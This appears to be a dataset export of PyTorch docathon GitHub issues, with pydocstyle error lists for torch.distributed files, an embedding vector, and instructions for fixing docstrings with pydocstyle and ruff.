- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_linear`, **Line**: 225, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_linear`, **Line**: 225, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_linear`, **Line**: 225, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_multihead_attn`, **Line**: 295, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_multihead_attn`, **Line**: 295, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_multihead_attn`, **Line**: 295, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_multihead_attn`, **Line**: 295, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_mlp`, **Line**: 369, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_mlp`, **Line**: 369, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_mlp`, **Line**: 369, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_prepare_input_validate`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_prepare_input_validate`, **Line**: 19, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_prepare_output_validate`, **Line**: 72, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_prepare_output_validate`, **Line**: 72, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_create_1d_device_mesh`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_create_1d_device_mesh`, **Line**: 119, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_create_1d_device_mesh`, **Line**: 119, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/fsdp.py`, **Entity**: `enable_2d_with_fsdp`, **Line**: 37, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/fsdp.py`, **Entity**: `enable_2d_with_fsdp`, **Line**: 37, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/fsdp.py`, **Entity**: `enable_2d_with_fsdp`, **Line**: 37, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/fsdp.py`, **Entity**: `enable_2d_with_fsdp`, **Line**: 37, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `input_reshard`, **Line**: 18, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `input_reshard`, **Line**: 18, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D200**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_pack_hook_tp`, **Line**: 62, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_pack_hook_tp`, **Line**: 62, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_pack_hook_tp`, **Line**: 62, **Description**: First line should be in imperative mood; try rephrasing (found 'Hook')
- **Error Code**: **D200**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_unpack_hook_tp`, **Line**: 83, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_unpack_hook_tp`, **Line**: 83, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_unpack_hook_tp`, **Line**: 83, **Description**: First line should be in imperative mood; try rephrasing (found 'Hook')

cc @carljparker",False,"[-2.02000234e-02 -4.18285429e-01 -2.83340245e-01 -2.24416003e-01
  7.83862323e-02 -1.09898448e-01  8.53284299e-02 -1.04433503e-02
 -3.42031777e-01  4.04966503e-01  1.64420187e-01  1.00021347e-01
  1.83659583e-01  2.58026212e-01 -1.88685924e-01  2.11729586e-01
 -1.51000902e-01 -3.45451146e-01  3.40850145e-01  2.40649059e-01
  2.80190587e-01  1.72407880e-01 -1.81448132e-01  1.13470420e-01
 -3.54903936e-01  2.57871926e-01 -2.07376137e-01 -1.47683695e-01
 -1.16561398e-01  1.90209299e-01  5.59442163e-01  6.33826852e-02
  1.13603529e-02  5.84968142e-02  3.78081411e-01  5.73452473e-01
 -2.00555831e-01 -1.48793384e-01  1.37017936e-01 -5.66967241e-02
 -4.72664237e-02  3.94847840e-02 -4.09758389e-02  1.77502781e-01
  5.57783339e-03 -4.02346551e-02 -4.29405987e-01  2.22013220e-01
 -2.11477950e-01 -8.29041451e-02  2.79848725e-02  2.20141262e-01
 -7.69426942e-01 -8.71442556e-02  2.97973037e-01  9.38930064e-02
  1.30206104e-02  5.77451468e-01  3.40692438e-02 -8.35899189e-02
  1.31546944e-01 -1.21318325e-02  2.03436807e-01  3.61853540e-01
 -4.08803046e-01  3.78453076e-01  1.33177340e-01  2.38708183e-01
  4.64287341e-01 -4.27162409e-01 -6.14337549e-02  1.48966819e-01
 -2.91253328e-01 -2.11785793e-01  3.25182587e-01  1.77012965e-01
 -3.67626011e-01  1.23679474e-01 -2.62356579e-01 -4.43875074e-01
 -2.29411900e-01  1.47313118e-01  6.27954379e-02 -2.55561322e-01
  2.47617662e-01 -1.57825515e-01  1.61179110e-01 -3.51955771e-01
  3.09194207e-01  6.79541519e-03  5.67500234e-01 -1.45373672e-01
  1.78120490e-02  2.88130701e-01 -1.09008048e-03  2.70332515e-01
  1.10676531e-02 -2.04781175e-01 -6.87393770e-02 -1.60662293e-01
  1.15661688e-01 -1.68424457e-01 -2.09615350e-01  4.07035172e-01
  1.96572274e-01 -9.60622877e-02  5.61580323e-02 -1.56760976e-01
 -1.43928438e-01  3.01314801e-01  7.87290651e-03 -6.83012009e-02
  2.78007507e-01  2.42995828e-01  2.84458160e-01  3.10294982e-03
 -4.63986963e-01 -1.13200396e-01 -1.35175437e-01  8.44578911e-03
  3.05244476e-01  1.75332725e-01  9.87510011e-03  2.18925059e-01
  4.27885503e-02 -2.82248724e-02  2.27861792e-01 -1.16043305e-02
  1.49857374e-02 -3.23611706e-01  2.62592137e-01 -2.48058185e-01
 -6.49773628e-02  1.24491833e-01  1.84468567e-01  1.37909045e-02
 -1.57855481e-01 -4.71032977e-01 -3.85245234e-02 -5.14678508e-02
 -2.60514379e-01 -4.16399390e-02 -5.49310595e-02 -2.95711309e-01
  3.91227722e-01  7.62074590e-01 -3.31994116e-01  3.86564136e-01
 -2.13942140e-01  2.02712923e-01 -5.75643554e-02 -1.11858889e-01
 -1.86204582e-01  2.82398790e-01 -1.04194872e-01  3.41382176e-01
  5.85763574e-01 -6.34251088e-02 -2.46955261e-01 -5.30924261e-01
  7.01009482e-03  2.62447238e-01  3.11872698e-02 -5.27099892e-02
 -6.55595809e-02  8.44210386e-02 -3.06813270e-01 -2.13822097e-01
 -5.14940441e-01  6.23484477e-02 -3.43581922e-02  1.66500986e-01
 -3.90523881e-01  7.30348332e-03  2.79466897e-01  6.92643076e-02
 -2.72164524e-01 -5.60116887e-01 -1.03290953e-01 -3.66637334e-02
 -1.93948790e-01  2.46083930e-01 -2.18927726e-01 -1.60391763e-01
 -1.62503004e-01  8.90458282e-03  2.80120820e-01 -6.12759851e-02
  7.11643845e-02 -5.15506528e-02 -1.33847922e-01 -3.29692602e-01
  2.60234684e-01 -8.21520686e-02 -1.11562587e-01 -2.56412864e-01
  5.09663343e-01  7.53305435e-01  4.21083979e-02  2.62334287e-01
 -1.68750793e-01  1.64800957e-01  1.35778248e-01 -5.07759266e-02
  4.30411696e-01  1.19105667e-01 -6.18573546e-01 -3.14233989e-01
 -7.00716153e-02  2.18354940e-01 -3.62447619e-01 -1.50960088e-02
 -1.99135482e-01 -4.03305650e-01 -1.93539232e-01  3.08708012e-01
  1.34799689e-01  7.22295344e-02  1.31238267e-01 -2.94004858e-01
  1.07951000e-01 -1.55777782e-01 -2.16483817e-01 -2.41166294e-01
  4.46969345e-02 -6.21320605e-02  1.03833854e-01 -9.97992232e-03
 -1.57286137e-01  1.15037426e-01 -1.01464957e-01 -2.82209311e-02
  6.69787049e-01 -3.14077765e-01  6.74687922e-02  1.51117176e-01
  4.77958694e-02 -9.94282290e-02  2.45999202e-01  4.11241651e-01
 -2.02831313e-01  8.24178848e-03  1.03698429e-02  2.39665359e-02
  1.64203808e-01 -3.17517608e-01 -3.29009056e-01 -1.47080183e-01
 -3.82853031e-01  2.23329931e-01 -3.62497240e-01 -2.07294032e-01
  1.46846801e-01 -1.13405064e-01  4.36608374e-01  7.33867586e-02
 -5.17439365e-01 -8.89070630e-02  4.04101796e-02  1.07924551e-01
 -1.00930527e-01  1.10681966e-01 -2.85098314e-01  6.20174766e-01
  4.11795139e-01 -1.85540263e-02 -3.16390216e-01  2.31811374e-01
  7.97186196e-02 -2.14122698e-01  3.63565944e-02 -3.15074563e-01
  4.48776901e-01  9.16389376e-02  3.59791189e-01 -4.53900173e-03
  2.15189070e-01 -2.24550754e-01 -2.00442582e-01  2.74914235e-01
 -3.63468081e-02  3.75120610e-01 -2.90726244e-01 -2.35354751e-01
  3.59031498e-01 -2.53854901e-01 -2.58279383e-01 -2.84550339e-01
 -4.70684141e-01 -2.97546625e-01 -1.72028750e-01  5.96140586e-02
  3.19788486e-01 -1.31507725e-01 -5.38891777e-02  1.72933161e-01
 -7.87166208e-02  9.79071259e-02  2.15384930e-01 -3.53716910e-01
 -4.58524019e-01 -1.15696363e-01 -4.54289615e-02  3.56819153e-01
  2.15875983e-01  2.05812484e-01  2.21793607e-01  2.92434752e-01
 -3.68527770e-02 -3.29647839e-01  3.81989062e-01  2.32850313e-01
 -3.46652448e-01 -1.64515339e-04 -2.43412793e-01  8.24603885e-02
  1.03745535e-01  5.75705111e-01  1.76205873e-01  1.43849164e-01
 -5.33707626e-03 -4.62798506e-01 -2.38863841e-01  2.58574933e-01
  8.82552266e-02 -5.31725764e-01 -2.11893618e-01  5.96721545e-02
 -3.42690200e-01 -2.71974742e-01  5.77411465e-02  3.12565684e-01
 -5.28353080e-02 -2.28759915e-01 -2.95199901e-01  4.69730645e-02
 -5.05010225e-02  2.80692577e-01  1.07090563e-01 -3.67923617e-01
  1.45855665e-01 -4.01135124e-02  2.87532900e-02 -5.64882457e-01
 -1.80180743e-01 -1.36055321e-01  3.37572098e-01  5.81693769e-01
 -2.09856525e-01 -6.44214898e-02  3.88305634e-01 -1.94021434e-01
 -1.80325918e-02  1.59426510e-01  4.46179584e-02  3.74701500e-01
 -6.99548274e-02  9.57665741e-02  5.52702583e-02  4.44126844e-01
 -3.30241233e-01 -9.59441960e-02 -2.02439129e-01 -3.53748858e-01
 -2.45782688e-01 -2.89055407e-01  4.72621247e-02  9.44590755e-03
  2.20206782e-01  1.09628722e-01 -4.78454232e-01  2.57767022e-01
 -1.82368904e-01  1.78198159e-01  3.19127798e-01  7.44198710e-02
  1.61413401e-01  2.89109219e-02  1.90232694e-01 -5.10898642e-02
 -3.15188289e-01  2.26808563e-01  7.78603405e-02 -5.93344495e-02]"
"Fix docstring errors in fully_sharded_data_parallel.py, api.py, graph_utils.py, distribute.py, iter_graph_module.py, comm_tensor.py, experimental_ops.py, batch_dim_utils.py, data_parallel.py, graph_optimization.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `FullyShardedDataParallel`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `FullyShardedDataParallel`, **Line**: 119, **Description**: First line should end with a period (not 's')
- **Error Code**: **D200**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `module`, **Line**: 473, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D402**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `module`, **Line**: 473, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `fsdp_modules`, **Line**: 512, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `fsdp_modules`, **Line**: 512, **Description**: First line should end with a period (not 'f')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `fsdp_modules`, **Line**: 512, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `apply`, **Line**: 531, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `apply`, **Line**: 531, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `apply`, **Line**: 531, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_mixed_precision_enabled_for_buffers`, **Line**: 572, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D200**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_low_precision_hook_enabled`, **Line**: 582, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_reset_lazy_init`, **Line**: 591, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `set_state_dict_type`, **Line**: 603, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `set_state_dict_type`, **Line**: 603, **Description**: First line should end with a period (not ')')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `get_state_dict_type`, **Line**: 705, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `get_state_dict_type`, **Line**: 705, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `state_dict_type`, **Line**: 746, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `state_dict_type`, **Line**: 746, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `state_dict_type`, **Line**: 746, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `forward`, **Line**: 785, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `forward`, **Line**: 785, **Description**: First line should end with a period (not 'c')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `forward`, **Line**: 785, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `summon_full_params`, **Line**: 818, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `summon_full_params`, **Line**: 818, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_deregister_orig_params_ctx`, **Line**: 884, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_deregister_orig_params_ctx`, **Line**: 884, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_deregister_orig_params_ctx`, **Line**: 884, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_apply`, **Line**: 904, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_apply`, **Line**: 904, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_buffers`, **Line**: 928, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_buffers`, **Line**: 928, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_buffers`, **Line**: 928, **Description**: First line should be in imperative mood (perhaps 'Override', not 'Overrides')
- **Error Code**: **D402**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_buffers`, **Line**: 928, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_parameters`, **Line**: 946, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_parameters`, **Line**: 946, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_parameters`, **Line**: 946, **Description**: First line should be in imperative mood (perhaps 'Override', not 'Overrides')
- **Error Code**: **D402**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_parameters`, **Line**: 946, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `no_sync`, **Line**: 981, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `no_sync`, **Line**: 981, **Description**: First line should end with a period (not 'P')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `no_sync`, **Line**: 981, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `clip_grad_norm_`, **Line**: 1022, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `clip_grad_norm_`, **Line**: 1022, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_optim_state_dict_impl`, **Line**: 1187, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_optim_state_dict_impl`, **Line**: 1187, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_optim_state_dict_to_load_impl`, **Line**: 1238, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_optim_state_dict_to_load_impl`, **Line**: 1238, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `full_optim_state_dict`, **Line**: 1293, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `full_optim_state_dict`, **Line**: 1293, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `sharded_optim_state_dict`, **Line**: 1358, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `sharded_optim_state_dict`, **Line**: 1358, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `sharded_optim_state_dict`, **Line**: 1358, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `shard_full_optim_state_dict`, **Line**: 1394, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `shard_full_optim_state_dict`, **Line**: 1394, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `flatten_sharded_optim_state_dict`, **Line**: 1466, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `flatten_sharded_optim_state_dict`, **Line**: 1466, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `flatten_sharded_optim_state_dict`, **Line**: 1466, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `scatter_full_optim_state_dict`, **Line**: 1509, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `scatter_full_optim_state_dict`, **Line**: 1509, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `rekey_optim_state_dict`, **Line**: 1591, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `rekey_optim_state_dict`, **Line**: 1591, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict`, **Line**: 1711, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict`, **Line**: 1711, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict`, **Line**: 1711, **Description**: First line should be in imperative mood (perhaps 'Transform', not 'Transforms')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict_to_load`, **Line**: 1804, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict_to_load`, **Line**: 1804, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `register_comm_hook`, **Line**: 1884, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `register_comm_hook`, **Line**: 1884, **Description**: First line should end with a period (not 'a')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `register_comm_hook`, **Line**: 1884, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_grad_norm`, **Line**: 1942, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_grad_norm`, **Line**: 1942, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_grad_norm`, **Line**: 1942, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_param_to_fqn`, **Line**: 1975, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_param_to_fqn`, **Line**: 1975, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_param_to_fqn`, **Line**: 1975, **Description**: First line should be in imperative mood (perhaps 'Construct', not 'Constructs')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_fqn_to_param`, **Line**: 2006, **Description**: First line should be in imperative mood (perhaps 'Construct', not 'Constructs')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/comm_tensor.py`, **Entity**: `CommTensor`, **Line**: 57, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/comm_tensor.py`, **Entity**: `CommTensor`, **Line**: 57, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/experimental_ops.py`, **Entity**: `_refine_sharding`, **Line**: 352, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/experimental_ops.py`, **Entity**: `_refine_sharding`, **Line**: 352, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `get_output`, **Line**: 43, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `get_output`, **Line**: 43, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `find_node`, **Line**: 56, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `find_node`, **Line**: 56, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `is_leaf_subgraph`, **Line**: 67, **Description**: 1 blank line required between summary line and description (found 0)
